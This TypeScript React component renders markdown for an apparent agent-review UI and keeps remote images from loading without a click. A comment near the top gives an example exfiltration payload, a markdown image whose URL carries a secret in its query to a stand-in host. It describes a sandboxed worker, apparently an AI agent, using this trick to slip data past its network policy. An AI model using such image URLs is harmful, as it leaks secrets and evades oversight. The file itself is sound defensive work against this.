import { createContext, isValidElement, useContext, type ReactNode } from "react";
import ReactMarkdown, { defaultUrlTransform, type Components, type UrlTransform } from "react-markdown";
import remarkGfm from "remark-gfm";
import "./ui.css";

/** An image the browser may fetch the moment the text renders: one from this
 *  origin, or inline data. Anything else would be fetched with no click, so a
 *  worker that wrote `![](https://its.host/?d=<secret>)` into a plan could send
 *  data out through this browser, past any network policy its sandbox has. */
function loadsOnItsOwn(src: string): boolean {
  if (/^data:image\//i.test(src)) return true;
  try {
    return new URL(src, location.href).origin === location.origin;
  } catch {
    return false;
  }
}

/** A remote image's host and path, without the query a secret would ride in. */
function where(src: string): string {
  try {
    const url = new URL(src, location.href);
    return `${url.host}${url.pathname}`;
  } catch {
    return src;
  }
}

/** react-markdown drops every `data:` URL; an inline image is let through. */
const urlTransform: UrlTransform = (url, key, node) =>
  key === "src" && node.tagName === "img" && /^data:image\//i.test(url) ? url : defaultUrlTransform(url);

/** Set inside a link: an `<a>` in an `<a>` is invalid HTML, and a badge
 *  (`[![build](https://ci/badge.svg)](https://ci)`) puts an image in one. */
const InLink = createContext(false);

/** A remote image: a link to it, or plain text inside a link, which stays
 *  the one thing to click. */
function RemoteImage({ src, alt }: { src: string; alt?: string }) {
  const label = `image: ${where(src)}`;
  if (useContext(InLink)) return <span className="md-img-link" title={alt || undefined}>{label}</span>;
  return (
    <a className="md-img-link" href={src} target="_blank" rel="noopener noreferrer" title={alt || undefined}>
      {label}
    </a>
  );
}

/** Links stay plain anchors (a new tab, nothing executed); a remote image is a
 *  link to it, opened only on a click; fenced code is <pre><code>, where the
 *  review page's tokenizer plugs in (W8). */
const components: Components = {
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer">
      <InLink.Provider value>{children}</InLink.Provider>
    </a>
  ),
  img: ({ src, alt }) => {
    if (typeof src !== "string" || !src) return alt ? <span>{alt}</span> : null;
    if (loadsOnItsOwn(src)) return <img src={src} alt={alt ?? ""} />;
    return <RemoteImage src={src} alt={alt} />;
  },
  pre: ({ children }) => <pre className="md-pre">{children}</pre>,
};

/** A fenced block's text and its language (from ```lang), for a caller that colours code. */
export type CodeRenderer = (text: string, lang: string | undefined) => ReactNode;

/** `code` replaces a fenced block's content; inline code stays as it is. */
function withCode(code: CodeRenderer): Components {
  return {
    ...components,
    pre: ({ children }) => {
      const props = isValidElement<{ className?: string; children?: ReactNode }>(children) ? children.props : null;
      if (!props || typeof props.children !== "string") return <pre className="md-pre">{children}</pre>;
      const lang = /language-(\S+)/.exec(props.className ?? "")?.[1];
      return <pre className="md-pre"><code>{code(props.children.replace(/\n$/, ""), lang)}</code></pre>;
    },
  };
}

/** The new UI's one markdown renderer (documents here, the review page's in W8). */
export function Markdown({ text, code }: { text: string; code?: CodeRenderer }) {
  return (
    <div className="md">
      <ReactMarkdown remarkPlugins={[remarkGfm]} urlTransform={urlTransform} components={code ? withCode(code) : components}>{text}</ReactMarkdown>
    </div>
  );
}
